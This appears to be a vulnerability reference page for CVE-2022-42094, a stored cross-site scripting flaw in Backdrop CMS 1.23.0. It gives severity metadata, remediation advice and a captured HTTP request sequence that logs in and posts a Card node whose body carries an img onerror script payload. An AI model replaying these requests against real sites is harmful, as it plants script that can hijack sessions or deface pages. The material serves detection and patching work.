---
layout: "post"
cve_id: "CVE-2022-42094"
title: "Backdrop CMS version 1.23.0 - Stored Cross Site Scripting"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-42094.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-42094.yaml"
author: "theamanrawat"
severity: "medium"
impact: "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to potential session hijacking, defacement, or theft of sensitive information.
"
remediation: "Upgrade to a patched version of Backdrop CMS or apply the necessary security patches provided by the vendor.
"
reference:
  - "https://github.com/backdrop/backdrop/releases/tag/1.23.0"
  - "https://github.com/bypazs/CVE-2022-42094"
  - "https://nvd.nist.gov/vuln/detail/CVE-2022-42094"
  - "https://backdropcms.org"
  - "https://github.com/ARPSyndicate/cvemon"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N', 'cvss-score': 4.8, 'cve-id': 'CVE-2022-42094', 'cwe-id': 'CWE-79', 'epss-score': 0.18257, 'epss-percentile': 0.94982, 'cpe': 'cpe:2.3:a:backdropcms:backdrop:1.23.0:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 4, 'vendor': 'backdropcms', 'product': 'backdrop', 'shodan-query': 'cpe:"cpe:2.3:a:backdropcms:backdrop"'}"
tags:
  - "cve"
  - "cve2022"
  - "xss"
  - "cms"
  - "backdrop"
  - "authenticated"
  - "intrusive"
  - "backdropcms"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Backdrop CMS version 1.23.0 was discovered to contain a stored cross-site scripting (XSS) vulnerability via the 'Card' content.


## üåê HTTP Request
```nohighlight
GET /?q=user/login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /?q=user/login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.12
Connection: close
Content-Length: 73
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

name=0QVVo1&pass=aztASI&form_build_id=6yMZbm&form_id=user_login&op=Log+in
```

```nohighlight
GET /?q=node/add/card HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.8
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /?q=node/add/card HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Connection: close
Content-Length: 2039
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWEcZgRB4detkrGaY
Accept-Encoding: gzip

------WebKitFormBoundaryWEcZgRB4detkrGaY
Content-Disposition: form-data; name="title"

38Bmkifcywz229Cky8LqftRjnRA
------WebKitFormBoundaryWEcZgRB4detkrGaY
Content-Disposition: form-data; name="files[field_image_und_0]"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryWEcZgRB4detkrGaY
Content-Disposition: form-data; name="field_image[und][0][fid]"

0
------WebKitFormBoundaryWEcZgRB4detkrGaY
Content-Disposition: form-data; name="field_image[und][0][display]"

1
------WebKitFormBoundaryWEcZgRB4detkrGaY
Content-Disposition: form-data; name="changed"


------WebKitFormBoundaryWEcZgRB4detkrGaY
Content-Disposition: form-data; name="form_build_id"

yTJlVq
------WebKitFormBoundaryWEcZgRB4detkrGaY
Content-Disposition: form-data; name="form_token"

zUfUsk
------WebKitFormBoundaryWEcZgRB4detkrGaY
Content-Disposition: form-data; name="form_id"

card_node_form
------WebKitFormBoundaryWEcZgRB4detkrGaY
Content-Disposition: form-data; name="body[und][0][value]"

<img src=x onerror=alert(document.domain)>

------WebKitFormBoundaryWEcZgRB4detkrGaY
Content-Disposition: form-data; name="body[und][0][format]"

full_html
------WebKitFormBoundaryWEcZgRB4detkrGaY
Content-Disposition: form-data; name="status"

1
------WebKitFormBoundaryWEcZgRB4detkrGaY
Content-Disposition: form-data; name="name"

1ax51B
------WebKitFormBoundaryWEcZgRB4detkrGaY
Content-Disposition: form-data; name="date[date]"

2023-04-13
------WebKitFormBoundaryWEcZgRB4detkrGaY
Content-Disposition: form-data; name="date[time]"

21:49:36
------WebKitFormBoundaryWEcZgRB4detkrGaY
Content-Disposition: form-data; name="path[auto]"

1
------WebKitFormBoundaryWEcZgRB4detkrGaY
Content-Disposition: form-data; name="comment"

1
------WebKitFormBoundaryWEcZgRB4detkrGaY
Content-Disposition: form-data; name="additional_settings__active_tab"


------WebKitFormBoundaryWEcZgRB4detkrGaY
Content-Disposition: form-data; name="op"

Save
------WebKitFormBoundaryWEcZgRB4detkrGaY--
```

